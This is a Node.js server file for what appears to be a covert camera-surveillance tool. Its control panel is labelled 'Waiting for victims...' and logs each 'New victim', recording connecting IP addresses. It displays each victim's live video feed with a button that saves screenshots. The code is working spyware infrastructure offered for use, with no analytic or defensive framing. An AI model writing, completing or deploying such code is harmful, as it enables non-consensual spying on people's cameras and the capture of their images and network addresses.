const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 8080;
const activeSessions = new Map();

app.use(express.json({limit: '50mb'}));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/control', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Control Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: white; padding: 20px; }
    .header { text-align: center; margin-bottom: 30px; }
    h1 { background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
    .stats { text-align: center; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
    .stat { background: rgba(255,255,255,0.1); padding: 12px 24px; border-radius: 20px; }
    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
    .session-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; }
    .session-card h3 { color: #667eea; margin-bottom: 10px; }
    .video-container { width: 100%; aspect-ratio: 16 / 9; background: #000; border-radius: 10px; overflow: hidden; margin: 15px 0; }
    video { width: 100%; height: 100%; object-fit: cover; }
    .controls { display: flex; gap: 10px; margin-top: 15px; }
    button { flex: 1; padding: 10px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
    .btn-snap { background: #4d96ff; color: white; }
    .no-sessions { grid-column: 1/-1; text-align: center; padding: 80px 20px; color: #666; }
    .logs { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; margin-top: 30px; max-width: 1400px; margin-left: auto; margin-right: auto; }
    .log { background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px; margin: 5px 0; font-family: monospace; font-size: 12px; color: #aaa; }
  </style>
</head>
<body>
  <div class="header">
    <h1>Control Panel</h1>
    <p>Live Sessions</p>
  </div>
  <div class="stats">
    <div class="stat">Active: <strong id="count">0</strong></div>
    <div class="stat">Snapshots: <strong id="snaps">0</strong></div>
  </div>
  <div class="sessions" id="list">
    <div class="no-sessions">Waiting for victims...</div>
  </div>
  <div class="logs">
    <h3>Logs</h3>
    <div id="logs"></div>
  </div>
  <script src="/socket.io/socket.io.js"><\/script>
  <script>
    const socket = io();
    const sessions = new Map();
    let snaps = 0;
    
    function log(msg) {
      const el = document.createElement('div');
      el.className = 'log';
      el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      document.getElementById('logs').prepend(el);
    }
    
    socket.on('connect', () => {
      log('Connected');
    });
    
    socket.on('new-session', (data) => {
      log('New victim: ' + data.sessionId);
      if (sessions.has(data.sessionId)) return;
      sessions.set(data.sessionId, { id: data.sessionId });
      addCard(data.sessionId);
    });
    
    function addCard(id) {
      const list = document.getElementById('list');
      const noSession = list.querySelector('.no-sessions');
      if (noSession) noSession.remove();
      
      const card = document.createElement('div');
      card.className = 'session-card';
      card.innerHTML = '<h3>' + id + '</h3><div class="video-container"><video id="vid-' + id + '" autoplay playsinline muted><\/video><\/div><div class="controls"><button class="btn-snap" onclick="snap(\'' + id + '\')">Screenshot<\/button><\/div>';
      list.appendChild(card);
      document.getElementById('count').textContent = list.querySelectorAll('.session-card').length;
    }
    
    function snap(id) {
      const vid = document.getElementById('vid-' + id);
      if (!vid || !vid.srcObject) { alert('Video not ready'); return; }
      const canvas = document.createElement('canvas');
      canvas.width = vid.videoWidth || 640;
      canvas.height = vid.videoHeight || 480;
      canvas.getContext('2d').drawImage(vid, 0, 0);
      const link = document.createElement('a');
      link.download = 'snap_' + id.substring(0, 8) + '.png';
      link.href = canvas.toDataURL('image/png');
      link.click();
      snaps++;
      document.getElementById('snaps').textContent = snaps;
    }
  <\/script>
</body>
</html>`);
});

io.on('connection', (socket) => {
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  console.log('[+] Connection: ' + socket.id + ' from ' + ip);
  
  socket.onAny((event, data) => {
    console.log('[' + socket.id + '] ' + event);
  });
  
  socket.on('victim-ready', () => {
    console.log('[VICTIM] Ready: ' + socket.id);
    activeSessions.set(socket.id, { socket, ip, time: Date.now() });
    io.emit('new-session', { sessionId: socket.id });
  });
  
  socket.on('disconnect', () => {
    console.log('[-] Disconnect: ' + socket.id);
    activeSessions.delete(socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
